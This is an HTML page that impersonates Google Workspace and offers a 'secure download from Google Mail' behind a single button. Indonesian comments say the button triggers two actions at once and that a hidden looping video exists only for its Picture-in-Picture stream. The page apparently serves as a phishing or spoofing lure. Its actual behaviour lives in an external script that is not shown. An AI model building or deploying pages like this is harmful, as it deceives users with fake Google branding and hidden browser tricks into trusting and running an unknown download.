<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Google Workspace - Secure Download</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding-top: 100px; }
        .btn { background-color: #1a73e8; color: white; padding: 15px 32px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
        .btn:hover { background-color: #1765cc; }
        video { display: none; } /* Video disembunyikan, hanya butuh streamnya untuk PiP */
    </style>
</head>
<body>
    <h1>Download Document</h1>
    <p>Please click the button below to start your secure download from Google Mail.</p>
    
    <!-- Tombol yang memicu dua aksi sekaligus -->
    <button class="btn" id="downloadBtn">Download Securely</button>

    <video id="pipVideo" loop muted playsinline>
        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
    </video>

    <script src="script.js"></script>
</body>
</html>
